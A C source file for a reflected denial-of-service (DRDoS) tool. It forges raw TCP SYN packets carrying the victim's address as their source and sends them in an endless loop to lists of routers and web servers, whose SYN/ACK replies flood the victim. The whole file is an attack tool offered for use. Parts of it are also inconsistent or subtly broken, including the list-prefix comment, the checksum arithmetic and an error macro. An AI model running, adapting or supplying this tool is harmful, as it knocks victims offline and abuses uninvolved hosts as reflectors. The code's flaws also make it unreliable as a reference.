/*
 * DRDoS.c         
 *
 * DRDoS Attack. -- sends tcp SYN packets to a list of 
 * ips. We could create this list scanning with nmap
 * ourselves and should have the final format:
 * r68.33.55.66 
 * h80.35.55.39
 * ... ....
 *
 * starting with 'g', are ips with open BGP port tcp 179 ( routers! ).
 * starting with 'h', will be ips we found with port tcp http 80 open ( web servers! ).
 * Pues, al mandar el SYN a dichas ips, estas responderan a la IP de nuestras
 * cabeceras ( la vicitma Spoofeada! ) kon un SYN/ACK; floodeandola
 * si se kumplen los rekisitos.
 * feel free to add ports to the list, modify it. 
 * Bits and pieces for socket raws etc. from around there, modified a bit. enjoy.
 *
*/ 


#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#ifdef __USE_BSD
#undef __USE_BSD
#endif
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define ERROR(msg) { perror(msg); exit -1; }
#define VERSION "1"
#define BUFFER_LEN 65536
#define DEFAULT_LEN (sizeof(struct tcphdr)+sizeof(struct iphdr))

char buff[65536];
char buffer[BUFFER_LEN];

struct drdos_t {
                struct sockaddr_in sin;     /* struct socket */
                int s;                      /* socket */
                int delay;                  /* delay between (ms) */
                u_short srcport;            /* source port a spoofear */
                u_short dstport;            /* dest port */
            /*    char *comm; */
               };

struct pseudohdr {
        struct in_addr saddr;
        struct in_addr daddr;
        unsigned char zero;
        unsigned char protocol;
        unsigned short length;
} *pseudoheader;

void drdos_tcp(struct drdos_t *, u_long);
u_long resolve(char *);
unsigned short cksum(unsigned short *, int);

int main(int argc, char *argv[])
{

   struct drdos_t sm;
   FILE *destfile;
   u_long a;
   u_long bcast[1024];
   char buf[32];
   char *p;
   int num = 0, on = 1;

   fprintf(stderr, "[+] Smurf-linux style Code to elaborate a DRDoS attack.\n");

   if (argc != 3) {
     fprintf(stderr, "[+] Uso: %s <Target> <destfile>\n\n", argv[0]);
     exit(0);
   }

    /* defaults .. */

   memset((struct drdos_t *)&sm, 0, sizeof(sm));
   sm.delay = 0; 
   sm.srcport = 80; /* atakamos web server ... KAMBIAME?! */
   sm.dstport = 0;
   sm.sin.sin_family = AF_INET;
   sm.sin.sin_addr.s_addr = resolve(argv[1]);
   sm.sin.sin_port = htons(0);

   if ((sm.s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
     fprintf(stderr, "[+] Error Creating Raw Socket!: %s\n", strerror(errno));
     fprintf(stderr, "[+] R U r00t?\n");
     exit(-1);
   }

   if (setsockopt(sm.s, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) == -1) {
     perror("setsockopt()");
     exit(-1);
   } 

   srand(time(NULL) * getpid());  

     while (1) {
        if ((destfile = fopen(argv[2], "r")) == NULL) {
          perror("Opening destfile");
          exit(-1);
         }
 
        while (fgets(buf, sizeof(buf), destfile) != NULL) {  
        p = buf;

        if (buf[0] == '#' || buf[0] == '\n') continue; /* TFreak's */

        buf[strlen(buf) -1] = '\0';

        if (buf[0] == 'r') {
          sm.dstport = 179;
          p++;
          fprintf(stderr, "%s\n", p); 
          bcast[num] = inet_addr(p);
          drdos_tcp(&sm, bcast[num]); 
          usleep(sm.delay); 
          num++;
        /*  fprintf(stderr, "NUM: %i PORT: %i\n", num, sm.dstport); */

        }  

        if (buf[0] == 'h') {
          sm.dstport = 80;
          p++;
          fprintf(stderr, "%s\n", p); 
          bcast[num] = inet_addr(p);
          drdos_tcp(&sm, bcast[num]); 
          usleep(sm.delay); 
          num++;
       /*   fprintf(stderr, "NUM: %i PORT: %i\n", num, sm.dstport); */
        }
        if (num == 1024) {
          num = 0;
          break;    /* No more than 1024 destinies!! */
        }  

        
   }
        num = 0;

        fclose(destfile);
   }

     /*   for (i = 0; bcast[i] != '\0'; i++) {
           drdos_tcp(&sm, bcast[i]);
           usleep(20000);
           fprintf(stderr, "*"); 
       } */

    /*   fclose(destfile); */
       return 0;

}

u_long resolve(char *host)
{

   struct in_addr in;
   struct hostent *he;

   if ((in.s_addr = inet_addr(host)) == -1) {
     if ((he = gethostbyname(host)) == NULL) {
       herror("gethostbyname()");
       exit(-1);
     }

   memcpy((caddr_t)&in, he->h_addr, he->h_length);

   }

   return(in.s_addr);

}

void drdos_tcp(struct drdos_t *sm, u_long dst)
{

   struct iphdr *iphdr;
   struct tcphdr *tcphdr;
   
   bzero(buffer, BUFFER_LEN);
   
   /* Make TCP HDR */
      tcphdr =                       (struct tcphdr *)(buffer+sizeof(struct iphdr));
      tcphdr->source =               htons(sm->srcport);
      tcphdr->dest =                 htons(sm->dstport);
      tcphdr->window =               htons(65535);
      tcphdr->seq =                  random();
      tcphdr->syn =                  1;
      tcphdr->doff =                 sizeof(struct tcphdr) / 4;

/* Make TCP PSEUDOHDR */
      pseudoheader =                 (struct pseudohdr *)((unsigned char *)tcphdr-sizeof(struct pseudohdr));
      pseudoheader->saddr.s_addr =          sm->sin.sin_addr.s_addr;
      pseudoheader->daddr.s_addr =          dst;
      pseudoheader->protocol =       IPPROTO_TCP;
      pseudoheader->length =         htons(sizeof(struct tcphdr));
      tcphdr->check =                cksum((unsigned short *)pseudoheader, sizeof(struct pseudohdr)+sizeof(struct tcphdr));
		
/* Make IP HDR */
      bzero(buffer, sizeof(struct iphdr));
      iphdr =                        (struct iphdr *)buffer; 
      iphdr->ihl =                   5;
      iphdr->version =               4;
      iphdr->tot_len =               htons(DEFAULT_LEN);
      iphdr->id =                    htons(random());
      iphdr->ttl =                   IPDEFTTL;
      iphdr->protocol =              IPPROTO_TCP;
      iphdr->daddr =                 dst;
      iphdr->saddr =                 sm->sin.sin_addr.s_addr;

/* Send TCP SYN packet */
      if(sendto(sm->s, buffer, DEFAULT_LEN, 0x0, (struct sockaddr *)&sm->sin, sizeof(struct sockaddr) ) != DEFAULT_LEN) {
                ERROR("sendto"); 
}
else {              
    fprintf(stderr, "*");
}
   /* fin de drdots_tcp() */

}

u_short cksum(addr, len)   /* a classic checksum */
u_short *addr;
int len;
{

    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) 
    {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) 
    {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

 
/* EOF */
                   
